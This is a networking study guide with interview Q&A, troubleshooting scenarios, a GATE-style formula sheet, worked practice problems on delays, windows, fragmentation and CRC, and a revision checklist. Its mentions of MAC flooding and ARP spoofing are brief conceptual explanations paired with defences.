# Interview Questions and Answers

**Q: What is the difference between the OSI model and the TCP/IP model?** A: OSI is a 7-layer theoretical reference model used to understand and standardize networking concepts, while TCP/IP is a 4-layer practical model that the actual internet is built on. TCP/IP combines several OSI layers (Application, Presentation, Session into one Application layer, and Physical/Data Link into one Network Access layer).

**Q: What happens when you type a URL into a browser and press Enter?** A: The browser checks its cache, then performs DNS resolution to get the IP address, establishes a TCP connection via a three-way handshake, performs a TLS handshake if HTTPS, sends an HTTP request, the server processes and returns a response, and the browser renders the page.

**Q: What is the difference between TCP and UDP, and when would you use each?** A: TCP is connection-oriented and reliable, ideal for applications like web browsing, email, and file transfer where data integrity matters. UDP is connectionless and faster but doesn't guarantee delivery, making it suitable for video streaming, VoIP, and gaming where speed matters more than perfect reliability.

**Q: Explain the TCP three-way handshake.** A: The client sends a SYN packet to initiate a connection, the server responds with SYN-ACK to acknowledge and agree, and the client sends a final ACK to confirm - after which the connection is established and data transfer can begin.

**Q: What is the difference between a switch and a router?** A: A switch operates at Layer 2, connecting devices within the same network and forwarding frames using MAC addresses stored in a CAM table. A router operates at Layer 3, connecting different networks and forwarding packets using IP addresses based on a routing table.

**Q: What is NAT, and why is it needed?** A: NAT translates private IP addresses into a public IP address so devices on a private network can communicate with the internet. It's needed because IPv4 address space is limited, and NAT allows many internal devices to share a single public IP.

**Q: What is the difference between NAT and PAT?** A: NAT can be a one-to-one (static) or many-to-many (dynamic pool) mapping of private to public IPs. PAT (NAT overload) is a many-to-one mapping where multiple internal devices share a single public IP, differentiated by unique port numbers.

**Q: What is subnetting and why is it used?** A: Subnetting divides a larger network into smaller subnetworks by borrowing bits from the host portion of an address. It's used to reduce broadcast domains, improve security through segmentation, and use IP address space efficiently.

**Q: What is the difference between a public and private IP address?** A: Private IPs are used within internal networks and are not routable on the internet (e.g., 192.168.x.x). Public IPs are globally unique and routable on the internet, typically assigned by an ISP.

**Q: What is a CAM table and how can it be attacked?** A: A CAM table maps MAC addresses to switch ports, allowing efficient frame forwarding. Attackers can perform a MAC flooding attack, overwhelming the table with fake addresses to force the switch into "fail-open" mode, flooding traffic to all ports and enabling sniffing.

**Q: What is the difference between symmetric and asymmetric encryption?** A: Symmetric encryption uses one shared key for both encryption and decryption, making it fast but requiring secure key distribution. Asymmetric encryption uses a public/private key pair, solving the key distribution problem but at the cost of speed.

**Q: What is the difference between encryption and hashing?** A: Encryption is reversible (given the correct key, ciphertext can be decrypted back to plaintext), used for confidentiality. Hashing is a one-way function used to verify integrity; the original data cannot be recovered from the hash.

**Q: What is the CIA triad?** A: Confidentiality (only authorized access), Integrity (data isn't altered), and Availability (systems accessible when needed) - the three core principles of information security.

**Q: What is the difference between IDS and IPS?** A: An IDS passively monitors traffic and alerts administrators to suspicious activity without blocking it. An IPS actively monitors and blocks or prevents malicious traffic in real time.

**Q: What is a DMZ and why is it used?** A: A DMZ is a network segment isolated between the internal trusted network and the external untrusted internet, used to host public-facing services like web or mail servers, limiting exposure of the internal network if that server is compromised.

**Q: What is the difference between IPv4 and IPv6?** A: IPv4 uses 32-bit addresses (about 4.3 billion addresses) in dotted decimal notation, while IPv6 uses 128-bit addresses in hexadecimal notation, offering a vastly larger address space, built-in IPsec support, and elimination of the need for NAT.

**Q: What is ARP and how does ARP spoofing work?** A: ARP (Address Resolution Protocol) resolves an IP address to a MAC address on a local network. ARP spoofing involves an attacker sending forged ARP replies to associate their own MAC address with another device's IP (often the gateway), allowing them to intercept traffic (a MITM attack).

# Scenario-Based Questions and Answers

**Scenario: A user reports they can access websites by IP address but not by domain name. What's the likely issue and how do you troubleshoot?** A: This points to a DNS resolution problem, not a connectivity problem. Steps: check DNS server configuration on the client (`ipconfig /all` or `cat /etc/resolv.conf`), try `nslookup` or `dig` on the domain, test with a different DNS server (e.g., 8.8.8.8), flush the local DNS cache, and check if the DNS server itself is reachable and responding.

**Scenario: Two departments on the same physical switch need to be isolated from each other for security reasons, but you can't add new physical switches. What do you do?** A: Implement VLANs to logically segment the switch into separate broadcast domains for each department. If they need to communicate, configure inter-VLAN routing through a Layer 3 switch or router, with appropriate ACLs to control what traffic is allowed between them.

**Scenario: A company's public-facing web server was compromised, and the attacker is now trying to move laterally into the internal network. What network design would have limited this risk?** A: The web server should have been placed in a DMZ, isolated from the internal network by a firewall, so that even if compromised, the attacker cannot directly reach internal systems without passing through additional security controls.

**Scenario: You notice unusually high broadcast traffic degrading network performance across a large flat network. What's the cause and the fix?** A: A large flat (unsegmented) Layer 2 network creates one large broadcast domain. As the number of devices grows, broadcast traffic (ARP requests, DHCP, etc.) increases and degrades performance. Fix: segment the network into VLANs/subnets to reduce the size of each broadcast domain.

**Scenario: A remote employee needs to securely access internal company resources from home. What solution do you implement?** A: A VPN (using IPsec or SSL/TLS) should be set up to create an encrypted tunnel between the employee's device and the corporate network, combined with MFA for authentication to reduce risk if credentials are compromised.

**Scenario: An internal application is randomly slow, and you suspect a switch is silently flooding traffic to every port instead of forwarding intelligently. What's happening and how do you confirm it?** A: This suggests a CAM table overflow (MAC flooding) attack or a full/corrupted CAM table causing the switch to behave like a hub. Confirm by checking the switch's MAC address table for abnormal entries or excessive entries from a single port, and check for high broadcast/flood traffic in monitoring tools. Mitigate with port security limiting the number of MAC addresses per port.

**Scenario: A user's laptop has an IP address like 169.254.x.x and cannot access the network. What does this indicate?** A: This is an APIPA address, indicating the device failed to get an IP from a DHCP server. Troubleshoot by checking DHCP server availability, cable/Wi-Fi connectivity, VLAN configuration on the switch port, and DHCP relay/scope configuration if the client is on a different subnet.

**Scenario: You need two servers to communicate securely over an untrusted network, ensuring both confidentiality and that neither side can later deny having sent a message. What do you implement?** A: Use TLS with mutual authentication (mTLS) for confidentiality and authentication, combined with digital signatures using each server's private key, ensuring non-repudiation - the signer cannot deny having signed the data since only their private key could have produced that signature.

**Scenario: Your organization's routing table shows a route to a destination via both OSPF (AD 110) and a static route (AD 1) with different next hops. Which one is used and why?** A: The static route is used because it has a lower administrative distance (1) than OSPF (110). Routers prefer routes with lower administrative distance regardless of the metric within a routing protocol, since AD determines trustworthiness of the source, not path efficiency.

**Scenario: A network segment is running out of usable IP addresses in its /24 subnet, but neighboring subnets have lots of unused addresses. What's the long-term fix?** A: Redesign the addressing scheme using VLSM (Variable Length Subnet Masking) to allocate subnet sizes based on actual host requirements per segment, rather than using a fixed /24 everywhere - freeing up unused address space from oversized subnets for undersized ones.

# GATE-Style Formula Sheet

| Topic | Formula or fact |
| --- | --- |
| Delays | Tt = L / B. Tp = d / v. a = Tp / Tt. BDP = B x RTT |
| Store-and-forward | Message switching: k x L / B. Packet switching: (k + n - 1) x p / B. Optimal packet data size = sqrt(L x h / (k - 1)) |
| Stop-and-wait | Efficiency = 1 / (1 + 2a) |
| GBN and SR | Efficiency = N / (1 + 2a). N for 100% = 1 + 2a. GBN window <= 2^k - 1. SR window <= 2^(k-1) |
| ALOHA | Pure: S = G e^(-2G), maximum 18.4%. Slotted: S = G e^(-G), maximum 36.8% |
| CSMA/CD | L\_min = 2 x Tp x B. Backoff: K in 0 to 2^n - 1 slots (slot = 512 bit times) |
| Ethernet | Frame 64 to 1518 B. Payload 46 to 1500 B. MAC 48 bits. FCS CRC-32 |
| CRC | Bits appended = degree of generator. Zero remainder at receiver means accepted |
| Hamming | 2^r >= m + r + 1. Detects d - 1, corrects floor((d - 1) / 2) errors |
| Routing | DV: D\_x(y) = min\[c(x, v) + D\_v(y)\]. RIP infinity = 16. Dijkstra O(V^2) |
| IPv4 | Hosts = 2^h - 2. Fragment data is a multiple of 8 B. Offset = byte position / 8. IHL in 4-byte words |
| TCP window | Throughput <= W / RTT. Wraparound limit: R <= 2^32 / T bytes per second |
| TCP RTO | RTO = EstimatedRTT + 4 x DevRTT (alpha = 1/8, beta = 1/4) |
| TCP congestion | Slow start doubles per RTT. Congestion avoidance +1 MSS per RTT. Loss: ssthresh = cwnd / 2. Timeout: cwnd = 1 |
| HTTP | Non-persistent: 2 RTT per object. Persistent: 1 RTT per object, pipelined: about 1 RTT total |

# GATE-Style Practice Problems with Answers

**Q1.** A link has bandwidth 2 Mbps, frame size 1000 bits and one-way propagation delay 10 ms. (a) Efficiency of stop-and-wait? (b) Window needed for 100% utilisation? (c) Sequence-number bits for GBN and SR? **Answer.** Tt = 0.5 ms, a = 20. (a) 1 / 41 = about 2.4%. (b) 41 frames. (c) GBN needs 42 numbers, so **6 bits**. SR needs 82 numbers, so **7 bits**.

**Q2.** A 1 Gbps CSMA/CD network is 1 km long and the signal speed is 2 x 10^8 m/s. Minimum frame size? **Answer.** Tp = 5 microseconds. L\_min = 2 x 5 x 10^-6 x 10^9 = 10,000 bits = **1250 bytes**.

**Q3.** A datagram with total length 3020 B (20 B header) passes through a link with MTU 1000 B. Describe the fragments. **Answer.** Data = 3000 B. Maximum data per fragment = floor(980 / 8) x 8 = 976. There are **4** fragments with data 976, 976, 976 and 72 B, offsets 0, 122, 244 and 366, and MF = 1, 1, 1, 0. Total lengths 996, 996, 996 and 92.

**Q4.** A router has entries 10.0.0.0/8 to port A, 10.1.0.0/16 to port B, 10.1.2.0/24 to port C. Where do 10.1.2.77 and 10.1.3.5 go? **Answer.** 10.1.2.77 goes to **C** (longest prefix /24). 10.1.3.5 goes to **B** (matches /8 and /16, longest is /16).

**Q5.** Find the network address, broadcast address and usable hosts for 192.168.5.130/27. **Answer.** Network **192.168.5.128**, broadcast **192.168.5.159**, usable .129 to .158 (**30 hosts**).

**Q6.** In TCP (slow-start doubling convention), cwnd = 16 MSS when a timeout occurs. After how many RTTs does cwnd reach 8, and what is it 2 RTTs later? **Answer.** ssthresh = 8 and cwnd = 1. It goes 1, 2, 4, 8, so **3 RTTs**. After 2 more RTTs of linear growth cwnd = **10**.

**Q7.** A TCP sender with a 65,535 B window uses a 100 Mbps link with RTT 50 ms. Throughput and utilisation? **Answer.** Throughput = 65,535 x 8 / 0.05 = about 10.49 Mbps, utilisation about 10.5%.

**Q8.** Find the CRC for data 1001 with generator 1011 (x^3 + x + 1). **Answer.** Append 3 zeros: 1001000. The remainder is **110**, so transmit **1001110**. Check: 1001110 divided by 1011 leaves remainder 0.

**Q9.** A 4000-bit message is sent over 3 links (2 switches), each 1 Mbps, in packets of 1000 bits (no header, ignore propagation). Total time? **Answer.** n = 4. Time = (3 + 4 - 1) x 1000 / 10^6 = **6 ms**. Without packetising: 3 x 4000 / 10^6 = 12 ms.

**Q10.** RTT = 100 ms. A page has a base file and 10 small images. Compare non-persistent serial, persistent without pipelining and persistent with pipelining (ignore transmission time and DNS). **Answer.** 2.2 s, 1.2 s and 0.3 s.

**Q11.** A pure ALOHA channel runs at 1 Mbps with 1000-bit frames. If G = 0.5 frames per frame time, what is the throughput? **Answer.** S = 0.5 x e^(-1) = about 0.184, so throughput is about **184 Kbps** (the maximum for pure ALOHA).

**Q12.** Two hosts, 10.0.0.2 and 10.0.0.3, both use source port 5000 to reach the same server through a NAT router. How does NAT keep them apart? **Answer.** NAT assigns each connection a different public source port (for example 5001 and 5002) with the same public IP and records (private IP, port) to (public IP, port) in its table. Replies are mapped back using the destination port.

**Q13.** Which of these use TCP: DNS query, DNS zone transfer, DHCP, BGP, RIP, OSPF, HTTP? **Answer.** DNS zone transfer, BGP and HTTP use TCP. DNS queries, DHCP and RIP use UDP. OSPF runs directly over IP (protocol 89).

# Last-Minute Revision Checklist

- Layer to PDU: physical bit, link frame, network packet, transport segment or datagram. Hop-to-hop is link. Host-to-host is network. Process-to-process is transport.
- Switch: learns by source MAC, floods unknown or broadcast. Router: rewrites the link header at every hop.
- GBN receiver window 1, SR receiver window equals sender window. Compute window size from 1 + 2a.
- CSMA/CD needs Tt >= 2 x Tp. Ethernet minimum 64 B, maximum 1518 B.
- DV sends tables to neighbours (RIP, UDP 520). LS floods link states to all (OSPF, over IP). BGP is path vector over TCP 179.
- IPv4: header 20 to 60 B, offsets in 8-byte units, reassembly only at destination, checksum recomputed per hop.
- CIDR: always compute block size from the mask, then find which block holds the address. Longest prefix wins.
- TCP: SYN and FIN consume a sequence number. Flow control uses rwnd, congestion control uses cwnd, and actual window = min(rwnd, cwnd). Timeout sets cwnd to 1, three dup ACKs in Reno halves it.
- Sockets: accept() returns a new socket. TCP connection = 4-tuple. UDP uses sendto and recvfrom.
- DNS: UDP 53 mostly, hierarchy root, TLD, authoritative, caching with TTL. HTTP: stateless, TCP 80, persistent connections save 1 RTT per object.

# Quick Reference Summary

| Concept | Layer | Key Point |
| --- | --- | --- |
| MAC Address | Layer 2 | Physical/hardware address |
| Switch | Layer 2 | Forwards using CAM table |
| IP Address | Layer 3 | Logical address |
| Router | Layer 3 | Forwards using routing table |
| TCP/UDP | Layer 4 | End-to-end transport |
| DNS/HTTP/FTP | Layer 7 | Application-level protocols |
| Framing, CRC, ARQ | Layer 2 | Hop-to-hop reliability (stop-and-wait, GBN, SR) |
| CSMA/CD, Ethernet | Layer 2 | Shared-medium access, 64 B minimum frame |
| RIP, OSPF, BGP | Layer 3 (app/transport carriers differ) | DV over UDP 520, LS over IP 89, path vector over TCP 179 |
| Fragmentation | Layer 3 | MTU based, offsets in 8-byte units, reassembly at destination |
| Flow and congestion control | Layer 4 | rwnd (receiver) and cwnd (network), window = min of the two |
